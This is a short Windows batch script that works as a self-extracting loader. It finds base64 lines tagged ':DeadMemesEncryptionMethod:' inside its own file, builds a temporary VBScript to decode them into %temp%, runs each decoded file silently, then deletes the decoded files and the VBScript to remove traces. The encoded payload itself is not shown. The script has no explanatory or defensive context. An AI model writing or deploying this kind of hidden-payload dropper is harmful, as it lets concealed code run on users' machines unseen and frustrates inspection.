@echo off
del %temp%\%%1 >nul
cls
SetLocal EnableDelayedExpansion & set "_FILES_=" & set "fil=" & set "ini="
set "_vbs_file_=%temp%\%~n0.vbs"
::search for encoded data
for /F "usebackq tokens=1-3 delims=:" %%1 in (`findstr /B /N ":DeadMemesEncryptionMethod:" "%~f0"`) do (
    if "%%3" EQU "!fil!" (set "_FILES_=!_FILES_!!fil!:!ini!:%%1,") else (set "fil=%%3" & set "ini=%%1")
)
set "_FILES_=%_FILES_:~0,-1%"
rem create a vbscript to do the decoding
for %%# in (%_FILES_%) do (
  for /F "tokens=1-3 delims=:" %%1 in ("%%#") do (
    (
      echo/set outStream=CreateObject("ADODB.Stream"^) ^: outStream.Type=1 ^: outStream.Open
      echo/set oFS=CreateObject("Scripting.FileSystemObject"^)
      echo/set inStream=oFS.OpenTextFile("%~f0",1,0,0^)
      echo/set oXML=CreateObject("MSXml2.DOMDocument"^)
      echo/set oItem=oXML.createElement("tmp"^)
      echo/oItem.DataType="bin.base64" ^: for i=1 to %%2 step 1 ^: inStream.readline ^: next
      echo/do while i^<%%3 ^: oItem.text=inStream.readline ^: decodedBytes=oItem.NodeTypedValue ^: outStream.Write decodedBytes ^: i=i+1 ^: loop
      echo/outStream.SaveToFile "%temp%\%%1",2 ^: inStream.close ^: outStream.close
      echo/set oItem=nothing ^: set oXML=nothing ^: set outStream=nothing ^: set inStream=nothing ^: set oFS=nothing
    )>"%_vbs_file_%"
    Cscript.exe /B /E:vbs "%_vbs_file_%" >NUL
    call %temp%\%%1
    del %temp%\%%1
  )
)
del /F /Q "%_vbs_file_%" 2>NUL
exit
